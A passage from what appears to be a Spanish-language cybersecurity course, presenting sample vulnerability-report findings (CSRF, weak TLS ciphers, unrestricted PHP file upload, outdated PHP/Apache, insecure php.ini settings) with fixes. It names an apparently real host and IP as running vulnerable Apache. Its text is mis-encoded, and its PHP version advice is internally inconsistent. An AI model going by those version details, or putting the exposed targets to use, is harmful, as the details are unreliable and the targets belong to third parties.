El objetivo m√°s com√∫n de un ataque CSRF es el robo de datos, identidad o dinero. Estos son algunos de los usos m√°s comunes de CSRF:

- **Puede comprometer todo el sistema de administraci√≥n de contenido**: Puede agregar o eliminar contenido en un sitio web. Si la v√≠ctima es el administrador, el atacante toma el control de todo el sitio.
- **Cambiar la contrase√±a de un usuario:** Si la v√≠ctima ha iniciado sesi√≥n en su cuenta, el atacante puede falsificar una solicitud para cambiar su correo electr√≥nico. Despu√©s de eso, puede falsificar una solicitud de restablecimiento de contrase√±a y tomar el control total de la cuenta de la v√≠ctima.
- **Agregar art√≠culos al carrito de un usuario o cambiar la direcci√≥n de entrega de un pedido:** En el caso de un ataque CSRF, el atacante puede modificar esta informaci√≥n. En el sitio web, la v√≠ctima aparece como autora de estas modificaciones.

## **Soluci√≥n**

Utiliza una biblioteca o marco comprobado que no acepte que ocurra esta debilidad o que proporcione construcciones que permitan que esta debilidad sea m√°s sencilla de evitar. Por ejemplo, utiliza el paquete anti-CSRG como el CSRGuard de OWASP.

Aseg√∫rate de que su aplicaci√≥n est√© libre de fallas de secuencias de comandos entre sitios, ya que la mayor√≠a de las defensas de CSRF pueden detenerse por medio del uso de secuencias de comandos manejadas por el atacante.

Origina un nonce √∫nico para cada uno de los formularios, col√≥calo en el formulario y confirme la independencia al obtener el formulario. Aseg√∫rate de que el nonce no sea predecible (CWE-330). Debes tener en cuenta que esto puede pasar desapercibido utilizando XSS.

Identificar las operaciones que sean especialmente peligrosas. Cuando el usuario desarrolla una operaci√≥n peligrosa, env√≠e una solicitud de confirmaci√≥n de forma separada para poder garantizar que el usuario tenga la intenci√≥n de desarrollar esa operaci√≥n.

Utiliza el control de gesti√≥n de la sesi√≥n de ESAPI. Este control introduce un elemento para CSRF y no utilice el m√©todo GET para ninguna de las solicitudes que puedan desencadenar un cambio de estado. Revisa que la solicitud se cre√≥ en la p√°gina esperada.

Un token anti-CSRF es un valor oculto que se env√≠a con las cookies y la solicitud del usuario en particular. As√≠ es como funciona:

- El servidor web genera este token y se coloca como un campo oculto en el formulario.
- Cuando el usuario completa y env√≠a el formulario, el token se incluye en la solicitud POST.
- El servidor comparar√° el token generado y el token enviado por el usuario.

Si coincide, la solicitud ser√° v√°lida. Si no coincide, la solicitud se considera inv√°lida. Esto evita que se produzcan ataques CSRF.

**O mediante plugins:** Headers Security Advanced & HSTS WP

[https://wordpress.org/plugins/headers-security-advanced-hsts-wp/](https://wordpress.org/plugins/headers-security-advanced-hsts-wp/)

![hsts](https://github.com/4GeeksAcademy/cybersecurity-syllabus/blob/main/assets/csrf.png?raw=true)

## Evidencias

![evidencia y referencias](https://github.com/4GeeksAcademy/cybersecurity-syllabus/blob/main/assets/evidencias.png?raw=true)

## Referencias:

- [https://wordpress.org/plugins/headers-security-advanced-hsts-wp](https://wordpress.org/plugins/headers-security-advanced-hsts-wp)
- [https://owasp.org/www-project-top-ten/2017/A5_2017-Broken_Access_Control.html](https://owasp.org/www-project-top-ten/2017/A5_2017-Broken_Access_Control.html)
- [https://owasp.org/www-project-web-security-testing-guide/v42/4](https://owasp.org/www-project-web-security-testing-guide/v42/4)-
- Web_Application_Security_Testing/06-Session_Management_Testing/05- Testing_for_Cross_Site_Request_Forgery
- [http://projects.webappsec.org/Cross-Site-Request-Forgery](http://projects.webappsec.org/Cross-Site-Request-Forgery)
- [http://cwe.mitre.org/data/definitions/352.html](http://cwe.mitre.org/data/definitions/352.html)
- [https://owasp.org/Top10/A01_2021-Broken_Access_Control/](https://owasp.org/Top10/A01_2021-Broken_Access_Control/)
- **[https://kinsta.com/es/base-de-conocimiento/hsts-missing-from-https-server/](https://kinsta.com/es/base-de-conocimiento/hsts-missing-from-https-server/)**

## **Ejemplo:**

NIVEL MEDIO - SSL/TLS usa algoritmos hashing y cifrado d√©biles

SSL (Secure Sockets Layer) y TLS (Transport Layer Security) son protocolos de seguridad utilizados para cifrar y proteger las comunicaciones en l√≠nea entre un cliente (como un navegador web) y un servidor. Estos protocolos garantizan la confidencialidad y la integridad de los datos transmitidos a trav√©s de Internet.

Los algoritmos de hash y cifrado son componentes esenciales de SSL/TLS, pero si se utilizan algoritmos d√©biles, la seguridad de las comunicaciones puede estar comprometida.

![SSL](https://github.com/4GeeksAcademy/cybersecurity-syllabus/blob/main/assets/ssl.png?raw=true)

- **Algoritmos de Hash**: Los algoritmos de hash son funciones matem√°ticas que convierten un conjunto de datos en una cadena de caracteres de longitud fija. Se utilizan para generar res√∫menes √∫nicos (hashes) de los datos, que luego se pueden comparar para verificar la integridad de los datos.

- **Algoritmos de Cifrado**: Los algoritmos de cifrado son utilizados por SSL/TLS para cifrar los datos transmitidos, de modo que solo el destinatario leg√≠timo pueda descifrarlos. Estos algoritmos aseguran la confidencialidad de la informaci√≥n.

- **Consecuencias de Hashing D√©bil**: Si se utilizan algoritmos de hash d√©biles, un atacante podr√≠a calcular f√°cilmente colisiones (dos conjuntos diferentes de datos que generan el mismo hash), lo que comprometer√≠a la integridad de la comunicaci√≥n. Esto podr√≠a llevar a la manipulaci√≥n de datos en tr√°nsito sin ser detectado.

- **Manipulaci√≥n de Datos**: Un atacante podr√≠a modificar los datos en tr√°nsito sin ser detectado, ya que podr√≠a generar un nuevo conjunto de datos que produzca el mismo hash que el conjunto original.

- **Integridad Comprometida**: Las verificaciones de integridad se vuelven ineficaces, ya que los hashes no garantizan que los datos no hayan sido alterados.

- **Consecuencias de Cifrado D√©bil**: Si se utilizan algoritmos de cifrado d√©biles, la informaci√≥n podr√≠a ser descifrada f√°cilmente por atacantes, lo que expondr√≠a los datos sensibles a la interceptaci√≥n y el robo.

- **Intercepci√≥n de Datos**: Atacantes pueden descifrar y robar informaci√≥n confidencial, como contrase√±as y datos financieros.

- **Exposici√≥n a Ataques**: Algoritmos de cifrado d√©biles pueden ser vulnerables a ataques de fuerza bruta y otros m√©todos de criptoan√°lisis.

## Soluci√≥n

Para garantizar una conexi√≥n segura con SSL/TLS, es importante:

1. Utilizar Algoritmos Fuertes: Se deben usar algoritmos de hash y cifrado robustos y actualizados que sean resistentes a los ataques actuales y futuros.
2. Actualizar Versiones: Utilizar las versiones m√°s recientes de SSL/TLS, ya que implementan mejoras de seguridad y retiran el soporte a algoritmos obsoletos.
3. Configurar Ajustes de Seguridad: Configurar adecuadamente los ajustes de seguridad en el servidor para deshabilitar algoritmos d√©biles y priorizar aquellos m√°s seguros.
4. Evaluar y Monitorear Regularmente: Realizar evaluaciones de seguridad peri√≥dicas para identificar posibles debilidades y mantenerse informado sobre las √∫ltimas amenazas y soluciones.

La elecci√≥n de algoritmos de hash y cifrado s√≥lidos es fundamental para asegurar que las comunicaciones a trav√©s de SSL/TLS sean seguras y confiables.

### **Solucion de Hashing D√©bil**:

- Utilizar Algoritmos Fuertes: Implementar algoritmos de hash robustos y resistentes a colisiones, como SHA-256 o superior, que sean menos susceptibles a ataques.
- Actualizar Software: Mantener actualizado el software y las bibliotecas de criptograf√≠a para asegurarse de que est√©n utilizando las √∫ltimas y m√°s seguras implementaciones de algoritmos de hash.

**Consecuencias de Cifrado D√©bil:**

- Priorizar Algoritmos Fuertes: Configurar los servidores para priorizar el uso de algoritmos de cifrado seguros y resistente, como AES en modo Galois/Counter Mode (AES-GCM) o ChaCha20-Poly1305.
- Desactivar Algoritmos D√©biles: Eliminar del conjunto de algoritmos permitidos aquellos que sean considerados d√©biles o inseguros.
- Actualizar Protocolos: Utilizar versiones actualizadas de TLS, como TLS 1.3, que han eliminado algoritmos de cifrado obsoletos y d√©biles.

> Evidencia y Referencias

![report](https://github.com/4GeeksAcademy/cybersecurity-syllabus/blob/main/assets/report.png?raw=true)

- [https://www.schneier.com/paper-ssl.pdf](https://www.schneier.com/paper-ssl.pdf)
- [http://www.phreedom.org/research/rogue-ca](http://www.phreedom.org/research/rogue-ca)
- [http://www.microsoft.com/technet/security/advisory/961509.mspx](http://www.microsoft.com/technet/security/advisory/961509.mspx)
- [http://www.kb.cert.org/vuls/id/836068](http://www.kb.cert.org/vuls/id/836068)
- [http://tools.ietf.org/html/rfc3279](http://tools.ietf.org/html/rfc3279)
- [https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2008-R2-and-2008/cc770833(v=ws.11)](https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2008-R2-and-2008/cc770833(v=ws.11))
- [https://technet.microsoft.com/en-us/library/ff458357.aspx](https://technet.microsoft.com/en-us/library/ff458357.aspx)
- [https://www.acunetix.com/blog/articles/tls-ssl-cipher-hardening/](https://www.acunetix.com/blog/articles/tls-ssl-cipher-hardening/)
- [https://www.owasp.org/index.php/Testing_for_Weak_SSL/TLS_Ciphers,_Insufficient_Transport_Layer_Protection_(OTG-CRYPST-001)](https://www.owasp.org/index.php/Testing_for_Weak_SSL/TLS_Ciphers,_Insufficient_Transport_Layer_Protection_(OTG-CRYPST-001))
- [https://www.acunetix.com/blog/articles/tls-ssl-cipher-hardening/](https://www.acunetix.com/blog/articles/tls-ssl-cipher-hardening/)

## **Ejemplo 3:**

Uploading de archivos sin restricci√≥n

A trav√©s de funcionalidades de la aplicaci√≥n es posible subir archivos a los servidores de la organizaci√≥n. Es posible subir cualquier tipo de archivo ya que los mismos no son controlados. De esta manera es posible tomar control completo del servidor a trav√©s de la subida de una Shell PHP.

**Dispositivos o sistemas afectados**

![descargas](https://github.com/4GeeksAcademy/cybersecurity-syllabus/blob/main/assets/descargas.png?raw=true)

![php](https://github.com/4GeeksAcademy/cybersecurity-syllabus/blob/main/assets/php.png?raw=true)

## **Recomendaciones y enlaces de referencia**

Se recomienda controlar los tipos de archivos subidos a la plataforma y solo permitir archivos predeterminados, como PDF/DOC/XLS, controlando el tipo de archivo a trav√©s de su *MIME Type*. Controlar el tipo de archivo por extensi√≥n no es suficiente.

En PHP se debe utilizar la funci√≥n *fileinfo()* para controlar el tipo de archivo subido.

**M√°s informaci√≥n**

- [https://www.owasp.org/index.php/Unrestricted_File_Upload](https://www.owasp.org/index.php/Unrestricted_File_Upload)
- [https://www.owasp.org/index.php/Protect_FileUpload_Against_Malicious_File](https://www.owasp.org/index.php/Protect_FileUpload_Against_Malicious_File)
- [https://stackoverflow.com/questions/11601342/upload-doc-or-pdf-using-php](https://stackoverflow.com/questions/11601342/upload-doc-or-pdf-using-php)
- [http://php.net/fileinfo](http://php.net/fileinfo)

## **Ejemplo 4:**

PHP m√∫ltiples vulnerabilidades

Se ha detectado que uno de los servidores utiliza PHP con versiones que ya no son soportadas, que tienen m√∫ltiples vulnerabilidades conocidas y p√∫blicas que permiten tomar el control del servidor web y realizar ataques de Denegaci√≥n de Servicio (DoS).

Adicionalmente, la rama 5.3.x ya no es soportada por el fabricante.

**Dispositivos o sistemas afectados**

- PHP 7.0.7
- Versiones soportadas: 7.1.x / 7.0.x

![Versiones soportadas:](https://github.com/4GeeksAcademy/cybersecurity-syllabus/blob/main/assets/versiones-soportadas.png?raw=true)

Algunas de estas vulnerabilidades tienen *exploits* disponibles que pueden ser aprovechados a trav√©s de herramientas como *CoreImpact o Metaexploit*.

**Recomendaciones y enlaces de referencia**

Se recomienda instalar la √∫ltima actualizaci√≥n de PHP (5.3.29 o superior) de forma inmediata y proceder a la migraci√≥n a una versi√≥n soportada (5.6.x o superior, y 7.1.x o superior).

**M√°s informaci√≥n**

- [http://www.php.net/releases/5_3_7.php](http://www.php.net/releases/5_3_7.php)
- [http://php.net/eol.php](http://php.net/eol.php)
- [https://www.exploit-db.com/exploits/29290](https://www.exploit-db.com/exploits/29290)
- [https://www.exploit-db.com/exploits/18836](https://www.exploit-db.com/exploits/18836)
- [https://www.cvedetails.com/vulnerability-list/vendor_id-74/product_id-128/version_id-90936/PHP-PHP-5.3.2.html](https://www.cvedetails.com/vulnerability-list/vendor_id-74/product_id-128/version_id-90936/PHP-PHP-5.3.2.html)
- [http://blog.kotowicz.net/2011/06/file-path-injection-in-php-536-file.html](http://blog.kotowicz.net/2011/06/file-path-injection-in-php-536-file.html)

## **Ejemplo 5:**

Apache no soportado

Se ha detectado que uno de los servidores utiliza Apache 2.0.x y 2.2.x, el cual tiene m√∫ltiples vulnerabilidades conocidas y p√∫blicas que permiten tomar el control del servidor web y/o realizar ataques de DoS.

### **Dispositivos o sistemas afectados**

- imss.institutoseguro.com.ar
- Versi√≥n instalada: Apache 2.2.15 (Linux/SUSE)
- Fin de soporte: 2017-07-11 (2.2.34)
- Anuncio: [http://archive.apache.org/dist/httpd/Announcement2.2.html](http://archive.apache.org/dist/httpd/Announcement2.2.html)
- Versiones soportadas: Apache 2.4.x

![Apache Linux](https://github.com/4GeeksAcademy/cybersecurity-syllabus/blob/main/assets/apache-linux.png?raw=true)

- 200.45.107.99
- Versi√≥n instalada: Apache 2.0.50
- Anuncio: [http://archive.apache.org/dist/httpd/Announcement2.0.html](http://archive.apache.org/dist/httpd/Announcement2.0.html)
- Versiones soportadas: Apache 2.4.x

Estas versiones tienen vulnerabilidades conocidas con exploits disponibles que puede ser aprovechados a trav√©s de herramientas como CoreImpact o Metaexploit.

### **Recomendaciones y enlaces de referencia**

Se recomienda instalar la √∫ltima esta actualizaci√≥n de Apache (2.0.59 y 2.2.34 o superior) de forma inmediata y proceder a la migraci√≥n a una versi√≥n soportada (2.4.38 o superior).

**M√°s informaci√≥n**

- [http://archive.apache.org/dist/httpd/Announcement2.2.html](http://archive.apache.org/dist/httpd/Announcement2.2.html)
- [https://github.com/apache/httpd/releases](https://github.com/apache/httpd/releases)

## **Ejemplo 6:**

Directivas inseguras de PHP

En las distintas instalaciones de PHP se han encontrado errores de configuraci√≥n.

**PHPinfo habilitado**

Se encontr√≥ un archivo que ejecuta la funci√≥n *phpinfo()*, encarga de brindar informaci√≥n del servidor.

**Aplicaciones afectadas**

![server-adr](https://github.com/4GeeksAcademy/cybersecurity-syllabus/blob/main/assets/server-adr.png?raw=true)

![allow_url_fopen](https://github.com/4GeeksAcademy/cybersecurity-syllabus/blob/main/assets/allow_url_fopen.png?raw=true)

> PHP allow_url_fopen habilitado

La directiva de configuraci√≥n de PHP *‚Äúallow_url_fopen‚Äù* est√° habilitada por defecto. Cuando est√° habilitada, esta directiva permite la recuperaci√≥n de datos desde ubicaciones remotas (sitio web o servidor FTP). Un gran n√∫mero de vulnerabilidades de inyecci√≥n de c√≥digo reportadas en aplicaciones web basadas en PHP son causadas por la combinaci√≥n de habilitaci√≥n de *‚Äúallow_url_fopen‚Äù* y un mal filtrado de entrada.

**PHP open_basedir no especificado**

La directiva de configuraci√≥n *‚Äúopen_basedir‚Äù* permite limitar los archivos que PHP puede abrir al √°rbol de directorios especificado. Cuando un script intenta abrir un archivo con, por ejemplo, *fopen()* o *gzopen()*, se comprueba la ubicaci√≥n del archivo. Cuando el archivo est√° fuera del √°rbol de directorios especificado, PHP rechazar√° abrirlo. *‚Äúopen_basedir‚Äù* es una buena protecci√≥n contra las vulnerabilidades de inclusi√≥n remota de archivos.

**Directorio PHPMyAdmin encontrado**

Se encuentra un directorio *‚Äúphpmyadmin‚Äù* habilitado que finalmente impacta contra una direcci√≥n IP interna de la organizaci√≥n: [https://192.168.3.21/phpMyAdmin/](https://192.168.3.21/phpMyAdmin/)

### **Aplicaciones afectadas**

![register_globals](https://github.com/4GeeksAcademy/cybersecurity-syllabus/blob/main/assets/register_globals.png?raw=true)

- **PHP register_globals habilitado**

Cuando *‚Äúregister_globals‚Äù* est√° habilitado, PHP crear√° autom√°ticamente variables en el √°mbito global para cualquier valor pasado en GET, POST o COOKIE. Esto, combinado con el uso de variables sin inicializaci√≥n, puede llevar a numerosas vulnerabilidades de seguridad.

- **PHP display_errors habilitado**

La directiva *‚Äúdisplay_errors‚Äù* determina si se deben enviar mensajes de error al navegador. Con frecuencia, estos mensajes contienen informaci√≥n confidencial sobre el entorno de su aplicaci√≥n web y nunca deben presentarse a fuentes que no sean de confianza.

- **PHP session.use_only_cookies desactivado**

Cuando *‚Äúuse_only_cookies‚Äù* est√° deshabilitado, PHP pasar√° el ID de sesi√≥n a trav√©s de la URL. Esto hace que la aplicaci√≥n sea m√°s vulnerable a los ataques de secuestro de sesi√≥n. El secuestro de la sesi√≥n es b√°sicamente una forma de robo de identidad en la que un atacante se hace pasar por un usuario leg√≠timo al robar su ID de sesi√≥n. Cuando el *token* de sesi√≥n se transmite en una *cookie* y la solicitud se realiza en un canal seguro (se utiliza SSL/TLS), este *token* es seguro.

### **Recomendaciones y enlaces de referencia**

Se debe deshabilitar la directiva de PHP ‚Äúallow_url_fopen‚Äù desde php.ini.

Habilitar un directorio base a trav√©s de la directiva *‚Äúopen_basedir‚Äù* desde *php.ini.*

Eliminar cualquier archivo que brinde informaci√≥n sobre el servidor y las aplicaciones instaladas (*phpinfo*, *test*, *phpmyadmin*, etc).

Desactivar *‚Äúregister_globals‚Äù* desde *php.ini* o *.htaccess*.

Desactivar *‚Äúdisplay_errors‚Äù* desde *php.ini* o *.htaccess*.

Activar *‚Äúsession.use_only_cookies‚Äù* desde *php.ini* o *.htaccess.*

**M√°s informaci√≥n:**

- [http://php.net/manual/en/filesystem.configuration.php](http://php.net/manual/en/filesystem.configuration.php)
- [http://www.php.net/manual/en/security.globals.php](http://www.php.net/manual/en/security.globals.php)
- [http://www.php.net/manual/en/errorfunc.configuration.php#ini.error-reporting](http://www.php.net/manual/en/errorfunc.configuration.php#ini.error-reporting)
- [http://php.net/ini.core](http://php.net/ini.core)
- [http://www.php.net/session.configuration](http://www.php.net/session.configuration)
- [http://www.php.net/manual/en/function.phpinfo.php](http://www.php.net/manual/en/function.phpinfo.php)

**Hemos concluido con el estudio de esta semana. Happy Hacking!!**